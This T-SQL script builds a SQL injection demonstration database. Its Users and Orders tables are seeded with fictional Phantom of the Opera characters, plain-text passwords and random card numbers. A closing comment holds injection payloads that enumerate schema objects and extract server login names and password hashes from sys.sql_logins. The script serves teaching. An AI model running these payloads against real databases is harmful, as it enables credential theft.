-- Modified from original source by Nazim Lala found at
-- http://blogs.iis.net/nazim/archive/2008/04/30/sql-injection-demo.aspx
SET NOCOUNT ON
USE master
GO

IF EXISTS (SELECT * FROM sys.databases WHERE [name] = 'InjectionDB')
    DROP DATABASE InjectionDB
GO

PRINT 'Create database'
CREATE DATABASE InjectionDB
GO

USE InjectionDB
GO

--DROP TABLE dbo.Users; DROP TABLE dbo.Orders;
CREATE TABLE dbo.Users (
    UserID      int             NOT NULL    IDENTITY,
    LoginName   varchar(100)    NOT NULL,
    UserName    varchar(100)    NOT NULL,
    [Password]  varchar(100)    NOT NULL
)
GO

CREATE TABLE dbo.Orders (
    OrderID     int             NOT NULL    IDENTITY,
    UserID      int             NOT NULL,
    --Amount      money           NOT NULL,
    Amount      decimal(10,2)   NOT NULL,
    CreditCard  varchar(100)    NOT NULL,
    NameOnCard  varchar(100)    NOT NULL
)
GO

--DELETE FROM dbo.Users; DELETE FROM dbo.Orders; DBCC CHECKIDENT('Users', RESEED, 0);

-- Populate Users
INSERT INTO dbo.Users (LoginName, UserName, [Password]) VALUES ('christine',   'Christine Daa�',      'Qutu2ubAPrA-')
INSERT INTO dbo.Users (LoginName, UserName, [Password]) VALUES ('carlotta',    'Carlotta Giudicelli', 'Pra6@QU4efra')
INSERT INTO dbo.Users (LoginName, UserName, [Password]) VALUES ('ubaldo',      'Ubaldo Piangi',       '?ru_eH9mupru')
INSERT INTO dbo.Users (LoginName, UserName, [Password]) VALUES ('meg',         'Meg Giry',            '3re#ehebResw')
INSERT INTO dbo.Users (LoginName, UserName, [Password]) VALUES ('joseph',      'Joseph Buquet',       'j+5rUdrUxuWr')

-- Populate Orders
DECLARE @ct         int
DECLARE @max        int
DECLARE @userID     int
DECLARE @userName   varchar(60)
DECLARE @amount     money
DECLARE @cc         char(16)

SET @ct = 0
SELECT @max = COUNT(*) FROM dbo.Users

WHILE @ct < @max BEGIN
    SET @ct = @ct + 1
    SELECT
        @userID   = UserID,
        @userName = UserName,
        @amount   = CONVERT(money, ROUND((RAND() * 100), 2)),
        @cc       = CONVERT(varchar(16), CONVERT(bigint, ROUND((RAND() * 10000000000000000), 0)))
    FROM dbo.Users
    WHERE UserID = @ct

    INSERT INTO dbo.Orders (UserID, Amount, CreditCard, NameOnCard) VALUES (@userID, @amount *  1, @cc, @userName)
    --INSERT INTO dbo.Orders (UserID, Amount, CreditCard, NameOnCard) VALUES (@userID, @amount * 10, @cc, @userName)
END

SELECT * FROM dbo.Users ORDER BY UserID
SELECT * FROM dbo.Orders ORDER BY OrderID
GO

/*
INSERT INTO Users VALUES('hack','hack','hack')
INSERT INTO Users SELECT '',CAST(id AS VARCHAR),name FROM sysobjects WHERE xtype='U'--
INSERT INTO Orders SELECT 1,1,CAST(id AS VARCHAR),name FROM sysobjects WHERE xtype='U'--
INSERT INTO Orders SELECT 2,2,COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users'--
INSERT INTO Orders SELECT 3,3,COLUMN_NAME,DATA_TYPE FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Orders'--

'OR 1=1;INSERT INTO Orders SELECT principal_id+1000,principal_id+1000,principal_id*1.0,name FROM sys.sql_logins UNION SELECT principal_id+1000,principal_id+1000,principal_id*1.0,master.dbo.fn_varbintohexstr(password_hash) FROM sys.sql_logins--

INSERT INTO Orders 
SELECT
    4,
    principal_id+1000,
    principal_id,--*1.0,
    name
FROM sys.sql_logins

UNION

SELECT
    5,
    principal_id+1000,
    principal_id,--*1.0,
    master.dbo.fn_varbintohexstr(password_hash)
FROM sys.sql_logins-- 
*/

